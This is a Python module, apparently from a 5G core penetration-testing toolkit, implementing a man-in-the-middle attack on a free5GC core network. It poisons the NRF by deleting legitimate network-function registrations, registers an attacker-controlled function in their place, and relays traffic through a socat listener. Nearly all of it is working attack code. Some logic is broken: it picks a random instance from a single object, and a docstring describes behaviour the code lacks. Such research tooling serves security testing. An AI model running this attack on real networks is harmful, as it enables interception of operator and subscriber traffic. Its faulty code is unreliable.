
from src.utils.common import get_ip_from_iface, generate_variables
from src.utils.protocols.api_cn.instance import NFInstance

import random
import os 

class CNMitm:
    
    attacker_instance: NFInstance|None = None
    attacker_token: str | None = None
    
    spoofed_instance: NFInstance|None = None
    mitm_instance: NFInstance|None = None
    
    def _nrf_poisonning(nf_to_spoof: str) -> bool: 
        """
        Performs NRF poisoning by removing legitimate NF instances of the specified type, 
        registering a spoofed attacker NF instance, and then re-adding the legitimate instances.
        Args:
            nf_to_spoof (NFInstance): The network function type to spoof.
        Returns:
            bool: True if the poisoning was successful, False otherwise.
        """
        
        # Get the list of registered NFs with the right type
        infos = CNMitm.attacker_instance.get_nf_info(CNMitm.attacker_token, nf_to_spoof)
        if "nfInstances" not in infos or not infos["nfInstances"]:
            return False

        # Remove the legitimate instances but store their informations for later 
        removed_instances: list[NFInstance] = []
        for legitimate_instance in infos["nfInstances"]:
            
            legitimate_id = legitimate_instance["nfInstanceId"]
            legitimate_address = legitimate_instance["ipv4Addresses"][0]
            legitimate_services = [s["serviceName"] for s in legitimate_instance["nfServices"]]
            
            legitimate_instance = NFInstance(legitimate_id, nf_to_spoof, legitimate_address, legitimate_services)
            removed = legitimate_instance.remove_nf(CNMitm.attacker_token)
            removed_instances.append(legitimate_instance)
            
            if not removed :
                return False

        # Informations for the new attacker NF
        mitm_addr = get_ip_from_iface("evil","eth0")
        mitm_id   = generate_variables("uuid")
        
        random_instance: NFInstance = random.choices(legitimate_instance)
        nb_of_service = random.randint(1, len(random_instance.services))  
        mitm_services = random.sample(random_instance.services, nb_of_service) # get N services from a random instance
        CNMitm.spoofed_instance = random_instance
        
        # Add the attacker as a NF of the right type
        CNMitm.mitm_instance = NFInstance.add_nf(mitm_id, nf_to_spoof, mitm_services, ip_address=mitm_addr, display=True)
        
        # Re-add the legitimate NFs
        for i in removed_instances:
            added = NFInstance.add_nf(i.nf_instance_id, nf_to_spoof, i.services, i.ip_address)
            
            if not added :
                return False
                        
        return True
                      
    def start(nf_to_spoof:str) -> bool:
        """
        Starts a MITM attack by spoofing a network function (NF) in the 5G core network.
        Args:
            nf_to_spoof (str): The network function instance to spoof. If null, a random NF type is selected.
        Returns:
            bool: True if the attack was successfully started, False otherwise.
        """
        
        # Get a token
        CNMitm.attacker_instance = NFInstance.add_random_nf()
        CNMitm.attacker_token = CNMitm.attacker_instance.get_token(scope="nnrf-disc", target_type="NRF")
        
        if not CNMitm.attacker_token : 
            return False
        
        # Start the poisonning
        if not CNMitm._nrf_poisonning(nf_to_spoof):
            return False
        
        free5gc_cn_port = 8000
        os.popen(f"socat TCP4-LISTEN:{free5gc_cn_port},fork TCP4:{CNMitm.spoofed_instance.ip_address}:{free5gc_cn_port}")

        return True

    def stop() -> bool:
        """
        Stops the MITM attack by terminating all 'socat' processes and removing the network function associated with the attacker token.

        Returns:
            bool: True if the network function was successfully removed, False otherwise.
        """
        os.popen("pkill -f socat")
        return CNMitm.mitm_instance.remove_nf(CNMitm.attacker_token)